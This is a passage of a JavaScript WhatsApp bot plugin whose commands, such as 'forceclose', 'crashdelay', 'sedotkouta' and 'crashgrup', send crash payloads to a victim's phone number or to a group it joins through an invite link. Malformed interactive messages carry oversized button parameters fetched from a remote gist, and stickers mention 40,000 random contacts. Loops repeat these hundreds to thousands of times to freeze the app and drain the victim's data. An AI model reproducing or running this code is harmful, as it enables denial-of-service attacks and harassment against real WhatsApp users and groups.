            businessMessageForwardInfo: {
              businessOwnerJid: tqw,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await rafiganteng.relayMessage(tqw, msg.message, {
    participant: { jid: tqw },
    messageId: msg.key.id
  });
await sleep(5000)
console.log("success send force close whatsapp api")
}
}


async function sedott(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await rafiganteng.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//COMBOX FUNC BUG FC ANJAY BY ZEXRO
async function SpaceGroup(target) {
  if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
    console.error("Error: Target JID tidak valid!", target);
    return;
  }

  let apiGrup;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiGrup = await res.text();
  } catch (err) {
    console.error("error fetching", err);
    return;
  }

  for (let i = 0; i < 200; i++) {
    try {
      const msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target
                  },
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                body: {
                  text: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉"
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: apiGrup + "GrupByrafiganteng"
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: apiGrup + "GrupByrafiganteng"
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: ""
                    },
                    {
                      name: "payment_status",
                      buttonParamsJson: ""
                    },
                    {
                      name: "review_order",
                      buttonParamsJson: ""
                    }
                  ]
                }
              }
            }
          }
        },
        {}
      );

      await rafiganteng.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });

      console.log(`Sent ${i + 1} to ${target}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (err) {
      console.error("Error mengirim bug:", err);
      break;
    }
  }
}
// END FUNCTION BUG //
switch (command) {

case 'forceclose': {
if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
if (!q) return m.reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`*Error!*\n\n_Use : ${prefix}${command} Number_\n_Example :  ${prefix}${command} 62xx_`)
let target = bijipler + '@s.whatsapp.net'

await doneress();

for (let i = 0; i < 1000; i++) {
    await HFC(target, null, 100000, true)
    await WaApi(target)
    await HFC(target, null, 100000, true)
    await WaApi(target);
}
}
break
case 'buginvis': {
if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
if (!q) return m.reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`*Error!*\n\n_Use : ${command} Number_\n_Example : ${prefix}${command} 62xx_`)
let target = bijipler + '@s.whatsapp.net'

await doneress()
;
for (let i = 0; i < 200; i++) {
    await sedott(target)
    await delayCrash(target, true);
    await protocolbug6(target)
    await sedott(target)
    await invisKontak(target)  
    await DelayStc(rafiganteng, target)
    await sedott(target)
    await delayCrash(target, false);
}
}
break
case 'crashdelay': {
if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
if (!q) return m.reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`*Error!*\n\n_Use : .${command} Number_\n_Example : ${prefix}${command} 62xx_`)
let target = bijipler + '@s.whatsapp.net'

await doneress();

for (let i = 0; i < 3000; i++) {
    for (let i = 0; i < 1000; i++) {
    await carousel(rafiganteng, target)
    await delayMakerInvisible(target)
}
    await delayCrash(target, false);
    await delayCrash(target, true);  
    
}
}
break
case 'combokeras': {
    if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
    if (!q) return m.reply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return m.reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";

    // Kirim pesan konfirmasi
    await doneress();
    // Kirim bug ke target
    for (let i = 0; i < 900; i++) {
    await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await DelayLoc(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await DelayLoc(target)
await protocolbug3(target, true)
await protocolbug2(target)
await DelayInVis(target, true)
await delayMakerInvisible(target)
await protocolbug2(target)
await InVisibleX(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await InVisibleX(target)
await protocolbug3(target, true)
await sendMessagesForDurationX(target)
await Blanking(target)
await DelayLoc(target)
await DelayInVis(target)
await InVisibleX(target)
await sendMessagesForDurationX(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await DelayLoc(target)
await protocolbug3(target, true)
await protocolbug2(target)
await protocolbug3(target, true)
await delayMakerInvisible(target)
await DelayLoc(target)
await protocolbug3(target, true)
await protocolbug2(target)
await DelayInVis(target, true)
await delayMakerInvisible(target)
await protocolbug2(target)
await InVisibleX(target, true)
await delayMakerInvisible(target)
await Blanking(target)
await protocolbug3(target, true)
await InVisibleX(target)
await protocolbug3(target, true)
await sendMessagesForDurationX(target)
await Blanking(target)
await DelayLoc(target)
await DelayInVis(target)
await InVisibleX(target) 
}
}
break
case 'waclose': {
    if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
    if (!q) return m.reply(`*penggunaan:*\n${prefix + command} 62xx / @tag`);

    let target = q.replace(/[^0-9]/g, "");
    
    if (target.startsWith('0')) {
        return m.reply(`nomor harus dimulai dengan kode negara.`);
    }
    let tqw = `${target}@s.whatsapp.net`;

  await doneress();
  // Parameters
  for (let r = 0; r < 666; r++) {
  await GxhorseForceClose(tqw);
  await GxhorseForceClose(tqw);
  await GxhorseForceClose(tqw);
}
}
break;

//KONTOL
case 'sedotkouta': {
if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
if (!q) return m.reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`*Error!*\n\n_Use : ${command} Number_\n_Example : .${command} 628xx_`)
let target = bijipler + '@s.whatsapp.net'

await doneress();

for (let i = 0; i < 200; i++) {
    await sedott(target)
    await sedott(target)
    await protocolbug6(target)
    await invisKontak(target)  
    await DelayStc(rafiganteng, target)
    await delayCrash(target, false);
}
}
break
case 'rafigrup': {
    // Tambahkan pengecekan akses
        if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
    if (!q) return m.reply(`Penggunaan Salah.\nContoh: .${command} https://chat.whatsapp.com/ atau .${command} 120363321780343299g.us`);   

    let groupLink = args[0];
    let groupId;
    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];
        
        if (!groupId) {
            return m.reply("Tautan grup tidak valid.");
        }
        
        let isTarget = await rafiganteng.groupAcceptInvite(groupId);

       m.reply(`*Sukses!* ${command} dikirim ke grup dengan tautan: ${groupLink} (ID Grup: ${groupId})`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        

    } else {
        groupId = groupLink;

        let isTarget = groupId;
        m.reply(`*Sukses!* ${command} dikirim ke grup dengan ID: ${groupId}`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);

    }
} 
break
case 'combogrup': {
    // Tambahkan pengecekan akses
        if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`)
    if (!q) {
        return m.reply(`Penggunaan Salah.\nContoh: .${command} https://chat.whatsapp.com/ atau .${command} 120363321780343299g.us`);
    }

    let groupLink = args[0];
    let groupId;
    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];
        
        if (!groupId) {
            return m.reply("Tautan grup tidak valid.");
        }
        
        let isTarget = await rafiganteng.groupAcceptInvite(groupId);

       m.reply(`*Sukses!* ${command} dikirim ke grup dengan tautan: ${groupLink} (ID Grup: ${groupId})`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        

    } else {
        groupId = groupLink;

        let isTarget = groupId;
        m.reply(`*Sukses!* ${command} dikirim ke grup dengan ID: ${groupId}`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        
    }
}
break
case 'blankgrup': {
    // Tambahkan pengecekan akses
        if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`)
    if (!q) {
        return m.reply(`Penggunaan Salah.\nContoh: .${command} https://chat.whatsapp.com/ atau .${command} 120363321780343299g.us`);
    }

    let groupLink = args[0];
    let groupId;
    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];
        
        if (!groupId) {
            return m.reply("Tautan grup tidak valid.");
        }
        
        let isTarget = await rafiganteng.groupAcceptInvite(groupId);

       m.reply(`*Sukses!* ${command} dikirim ke grup dengan tautan: ${groupLink} (ID Grup: ${groupId})`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        

    } else {
        groupId = groupLink;

        let isTarget = groupId;
        m.reply(`*Sukses!* ${command} dikirim ke grup dengan ID: ${groupId}`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);

    }
}
break
case 'crashgrup': {
    // Tambahkan pengecekan akses
        if (!ismurbug) return rafiganteng.reply(m.chat, `*[Akses Ditolak!!]*\nFitur Ini Khusus Murbug ${global.setting.nama}`);
    if (!q) {
        return m.reply(`Penggunaan Salah.\nContoh: .${command} https://chat.whatsapp.com/ atau .${command} 120363321780343299g.us`);
    }

    let groupLink = args[0];
    let groupId;
    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];
        
        if (!groupId) {
            return m.reply("Tautan grup tidak valid.");
        }
        
        let isTarget = await rafiganteng.groupAcceptInvite(groupId);

       m.reply(`*Sukses!* ${command} dikirim ke grup dengan tautan: ${groupLink} (ID Grup: ${groupId})`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        

    } else {
        groupId = groupLink;

        let isTarget = groupId;
        m.reply(`*Sukses!* ${command} dikirim ke grup dengan ID: ${groupId}`);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);
        await SpaceGroup(isTarget);

    }
}
break
}
}

handler.help = handler.command = ['forceclose','buginvis','crashdelay','combokeras','waclose','sedotkouta','rafigrup','combogrup','blankgrup','crashgrup']
handler.tags = ['bug']

export default handler